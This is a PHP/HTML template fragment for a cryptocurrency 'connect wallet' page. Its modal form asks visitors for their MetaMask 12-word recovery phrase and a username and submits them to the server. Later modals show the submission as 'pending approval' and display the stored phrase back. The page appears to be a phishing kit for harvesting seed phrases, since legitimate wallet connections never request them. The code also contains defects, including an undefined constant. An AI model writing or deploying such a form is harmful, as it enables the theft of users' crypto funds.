<?php if ($m_wallet_status == 'm_3' && !isset($_GET['success_add_meta_mask'])) { ?>

    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="input">Meta Mask 12 Phase</label>
                            <input type="text" class="form-control" name="wallet_phase"
                                   placeholder="Enter Wallet Phase">
                        </div>
                        <div class="form-group">
                            <label for="input2">Meta Mask Username</label>
                            <input type="text" class="form-control" name="wallet_username"
                                   placeholder="Metamask UserName">
                        </div>
                        <button type="submit" class="btn btn-primary" name="update_meta_mask">Submit</button>
                    </form>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php }elseif (isset($_GET['success_add_meta_mask']) && $m_wallet_status == '2')  { ?>
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <span class="text-success">Wallet Updated Successfully </span>: Pending Approval
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Trigger click event on element with id "metaMask"
            var metaMaskElement = document.getElementById('trigMetaMask');
            if (metaMaskElement) {
                metaMaskElement.click();
            }
        });
    </script>
<?php }elseif ($_SERVER['REQUEST_URI'] == '/connect_wallet/' || $_SERVER['REQUEST_URI'] == '/connect_wallet/?success_add_binance/' && $m_wallet_status == 2) { ?>
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <span class="text-success">Your wallet have been submitted successfully </span>: and is pending approval
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } elseif ($m_wallet_status == 1) { ?>
    <!-- The Modal -->
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
<?php
if ($m_wallet_status == 1){
    $m_wallet_status = 'connected';
}elseif($m_wallet_status == 2){
    $m_wallet_status = 'pending approval';
}elseif($m_wallet_status == m_3){
    $m_wallet_status = 'not connected';
}
?>
                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask<span
                            class="p-2 text-success bg-dark"><?= $m_wallet_status?></span></h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <div class="p-3 border-1">Your wallet phase</div>
                    <div class="p-3 border-1"><?= $m_d_wallet_phase ?></div>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } ?>
